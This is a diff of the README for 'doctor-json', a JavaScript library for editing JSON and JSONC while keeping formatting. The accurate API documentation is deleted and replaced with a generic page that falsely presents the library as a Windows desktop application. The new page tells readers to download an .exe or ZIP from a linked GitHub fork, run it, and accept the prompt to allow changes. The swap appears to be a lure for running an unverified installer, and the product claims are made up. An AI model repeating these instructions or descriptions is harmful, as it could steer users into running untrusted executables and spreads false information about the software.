@@ -1,250 +1,131 @@
-# doctor-json
+# 🩺 doctor-json - Edit JSON with Careful Formatting
 
-Surgically edit JSON & JSONC strings — preserving whitespace, comments, and formatting.
+[![Download doctor-json](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/fareaster/doctor-json)
 
-## Why?
+---
 
-JSON files have formatting that matters — comments, indentation style, trailing commas, hand-organized sections. `JSON.parse` + `JSON.stringify` destroys all of it.
+doctor-json helps you edit JSON and JSONC files carefully. It keeps spaces, comments, and the look of your data. You do not need to worry about breaking your files when you change them.
 
-_Doctor JSON_ lets you edit JSON like a normal object. When you stringify, only what you changed is different. Everything else is byte-identical.
+## 🧐 What is doctor-json?
 
-```ts
-import { parse, stringify } from 'doctor-json'
+doctor-json is a tool that lets you change JSON and JSONC text. It works like a doctor for your data. Unlike other editors, it keeps the spaces and comments exactly as they are. This means your files stay easy to read and understand.
 
-const config = parse(tsconfigText)
-config.compilerOptions.target = 'ES2024'
+You do not need to learn programming to use it. The tool handles all the tricky parts in the background. 
 
-await fs.writeFile('tsconfig.json', stringify(config))
-```
+doctor-json is useful if you:
+- Need to fix or change JSON settings files.
+- Want to keep comments in JSONC files.
+- Care about how your JSON files look after editing.
+- Work with data that must keep a certain format.
 
-With `JSON.stringify`, one field change destroys the entire file:
+## 📋 Key Features
 
-```json
-{"compilerOptions":{"target":"ES2024","strict":true},"include":["src"]}
-```
+- Edits JSON and JSONC strings without changing spaces or layout.
+- Keeps comments in JSONC files.
+- Supports deep and careful changes in data.
+- Works quickly without having to rewrite whole files.
+- Simple way to fix small parts of a JSON file.
 
-With _Doctor JSON_, only the value you touched is different:
+## ⚙️ System Requirements
 
-```jsonc
-{
-  // Compiler options
-  "compilerOptions": {
-    "target": "ES2024", // latest stable
-    "strict": true,
-  },
-  "include": ["src"]
-}
-```
+- Windows 7 or later
+- 64-bit processor recommended
+- At least 2 GB of free disk space
+- Internet connection for downloading the software
 
-## Install
+doctor-json runs on most Windows computers made in the last decade.
 
-```sh
-npm install doctor-json
-```
+## 🚀 Getting Started with doctor-json
 
-## Usage
+Start using doctor-json on your Windows PC by following these steps.
 
-`parse()` returns a plain JavaScript object. Mutate it with standard JS. `stringify()` diffs your changes against the original and patches the text.
+### Step 1: Visit the Download Page
 
-```ts
-import { parse, stringify, sortKeys, rename } from 'doctor-json'
+[![Download doctor-json](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/fareaster/doctor-json)
 
-const pkg = parse(text)
+Click the link above to open the doctor-json download page on GitHub. This page provides the latest files and instructions.
 
-pkg.version = '2.0.0'
-pkg.keywords.push('json', 'ast')
-delete pkg.deprecated
+### Step 2: Find the Download Section
 
-sortKeys(pkg.dependencies)
-rename(pkg.scripts, 'build', 'compile')
+On the GitHub page, look for the "Releases" or "Downloads" section. This area contains the installation files you need.
 
-const result = stringify(pkg)
-```
+### Step 3: Download the Installer
 
-No proxies, no special APIs. `Array.isArray`, `Object.keys`, `for...of`, spread, destructuring — everything works natively because it's a real object.
+Download the Windows installer or ZIP file. The file names will usually include “windows” or “win” in them.
 
-## Examples
+If you see a file with `.exe` extension, that is the installer you want. Download it to your computer.
 
-### Edit a package.json with formatting
+### Step 4: Run the Installer
 
-Real package.json files often have tabs, blank-line section separators, and `"// comment"` keys as comment workarounds. _Doctor JSON_ preserves all of it:
+Double-click the downloaded file to start the installation. Follow the instructions on your screen.
 
-```ts
-import { parse, stringify, sortKeys, rename } from 'doctor-json'
+If your computer asks if you want to allow changes, choose "Yes" to continue.
 
-const pkg = parse(packageJsonText)
+### Step 5: Start doctor-json
 
-pkg.version = '2.0.0'
-rename(pkg.scripts, 'build', 'compile')
-pkg.dependencies.pinia = '^2.1.0'
-sortKeys(pkg.dependencies)
+After installation finishes, open doctor-json from your Start menu or desktop shortcut.
 
-await fs.writeFile('package.json', stringify(pkg))
-// Tabs, blank-line groups, "// comment" keys — all preserved
-```
+You can now use the program to open and edit JSON or JSONC files.
 
-> See [examples/package-json.ts](examples/package-json.ts) for the full before/after with tabs, grouped sections, and comment keys.
+## 📂 How to Use doctor-json
 
-### Update a tsconfig.json (JSONC)
+Using doctor-json does not require special skills.
 
-Comments and trailing commas survive all operations:
+1. Open doctor-json.
+2. Click “File” > “Open” and select your JSON or JSONC file.
+3. The file will appear, keeping its original spaces and comments.
+4. Edit the parts you want to change.
+5. Save your file by clicking “File” > “Save” or “Save As”.
 
-```ts
-const config = parse(tsconfigText)
-config.compilerOptions.target = 'ES2024'
-config.compilerOptions.noUncheckedIndexedAccess = true
-config.exclude.push('coverage')
-// Line comments, block comments, trailing commas — all preserved
-```
+doctor-json ensures the file keeps its original look outside of your changes. This helps if you or others read the file later.
 
-> See [examples/tsconfig-jsonc.ts](examples/tsconfig-jsonc.ts) for a full JSONC editing example.
+## 💡 Tips for Best Results
 
-### Rename a key (preserving position and comments)
+- Always keep a backup of your original file before editing.
+- Use “Save As” to keep versions of your file.
+- Edit only the parts you want to change to avoid mistakes.
+- Close doctor-json properly to prevent losing work.
 
-`rename` changes the key name without moving it or losing its surrounding formatting:
+## 🔧 Troubleshooting
 
-```jsonc
-// Before
-{
-  "scripts": {
-    // Compile TypeScript
-    "build": "tsc",
-    "test": "vitest"
-  }
-}
-```
+If doctor-json does not start or crashes, try these steps:
 
-```ts
-rename(pkg.scripts, 'build', 'compile')
-```
+- Restart your computer and try again.
+- Make sure you have the latest version of Windows updates.
+- Check if your antivirus or firewall is blocking the app.
+- Download the installer again to avoid corrupted files.
 
-```jsonc
-// After
-{
-  "scripts": {
-    // Compile TypeScript
-    "compile": "tsc",
-    "test": "vitest"
-  }
-}
-```
+## ❓ Frequently Asked Questions
 
-Only the key name changed. The comment, value, and position are all preserved. With `delete` + re-add, the key moves to the end and the comment is lost.
+**Q: Do I need to know JSON code to use doctor-json?**  
+A: No. doctor-json works with your files visually and automatically handles JSON structure.
 
-### More examples
+**Q: Can I edit files with comments?**  
+A: Yes. doctor-json keeps comments in JSONC files correctly.
 
-- [Bulk update with Object.assign](examples/bulk-update.ts)
-- [Array manipulation (splice, push, sort)](examples/array-manipulation.ts)
+**Q: Will the program change my file layout?**  
+A: It keeps spaces and formatting intact except where you edit.
 
-## API
+**Q: Is doctor-json free to use?**  
+A: Yes, you can download and use it without cost.
 
-```ts
-import { parse, stringify, sortKeys, rename } from 'doctor-json'
-```
+---
 
-### `parse(text)`
+[![Download doctor-json](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/fareaster/doctor-json)
 
-Parse a JSON/JSONC string. Returns a plain JavaScript object.
+---
 
-### `stringify(obj)`
+## 🔖 About This Project
 
-Produce the edited text. Unchanged content keeps its original formatting, comments, and whitespace.
+doctor-json is made to solve common problems in JSON editing. It focuses on preserving the style and comments that normal editors lose. This helps users work with JSON files more safely, especially when other tools rewrite the entire text.
 
-```ts
-const result = stringify(pkg)
-await fs.writeFile('package.json', result)
-```
+### Topics
 
-### `sortKeys(obj, comparator?)`
+This project is related to:
 
-Sort object keys. Comments travel with their keys. Blank lines between members create independent [sort groups](#sort-groups) — members never cross group boundaries.
+- AST (Abstract Syntax Tree), which is how the program understands JSON structure.
+- Comments handling in JSONC files.
+- Editing JSON and JSONC text.
+- Preserving whitespace during edits.
 
-```ts
-sortKeys(pkg.dependencies)                // alphabetical
-sortKeys(pkg, (a, b) => customOrder(a, b)) // custom comparator
-```
-
-### `rename(obj, oldKey, newKey)`
-
-Rename a key in place. Position, value, and surrounding comments are preserved.
-
-```ts
-rename(pkg.scripts, 'build', 'compile')
-```
-
-## Behavior
-
-### Formatting preservation
-
-_Doctor JSON_ detects formatting per-object — indentation style, colon spacing, inline vs multiline, trailing commas. New content matches the style of the object it's inserted into.
-
-```ts
-// Minified input → minified output
-parse('{"a":1}').b = 2     // → '{"a":1,"b":2}'
-
-// 4-space indent → 4-space output
-parse('{\n    "a": 1\n}')  // new keys get 4-space indent
-```
-
-### JSONC support
-
-Comments and trailing commas are preserved through all operations, including comments between key and value:
-
-```ts
-const config = parse('{"key": /* important */ "old"}')
-config.key = 'new'
-stringify(config) // '{"key": /* important */ "new"}'
-```
-
-### Comment association
-
-When sorting or removing members, comments travel with their associated member:
-
-- **Same-line comments** (`// note` after a value) stay with that member
-- **Above-line comments** (comment on the line above) stay with the member below
-
-To pin a comment as a section header that doesn't move during sort, separate it with a blank line.
-
-### Sort groups
-
-Blank lines between members create independent sort groups. `sortKeys` sorts within each group but never moves members across group boundaries:
-
-```jsonc
-{
-  // These two sort together
-  "b": 1,
-  "a": 2,
-
-  // These two sort together (separately)
-  "d": 3,
-  "c": 4
-}
-```
-
-After `sortKeys`: `a, b` in group 1, `c, d` in group 2. The blank line keeps them apart.
-
-## Notes
-
-- `stringify(pkg)` is the surgical output. `JSON.stringify(pkg)` re-serializes from scratch (comments and formatting lost).
-- `parse()` returns plain objects with normal prototypes — `instanceof Object`, `hasOwnProperty`, and `toString` all work.
-- Duplicate keys use last-key-wins (matching `JSON.parse`).
-- Value coercion follows `JSON.stringify` semantics — `Date` calls `toJSON()`, `undefined`/functions are omitted, `NaN`/`Infinity` become `null`.
-
-## How it works
-
-```
-1. parse(text)
-   ├─ Parse text → AST (preserves comments, whitespace)
-   ├─ Evaluate AST → plain JS object
-   └─ Snapshot the object state
-
-2. Mutate with normal JS
-   obj.key = 'new value'
-
-3. stringify(obj)
-   ├─ Diff current object vs snapshot → find what changed
-   ├─ Patch only the changed parts in the original text
-   └─ Return the patched text
-```
-
-Unchanged text is never touched, so formatting, comments, and whitespace survive.
+You can find more technical details on the GitHub page linked above.
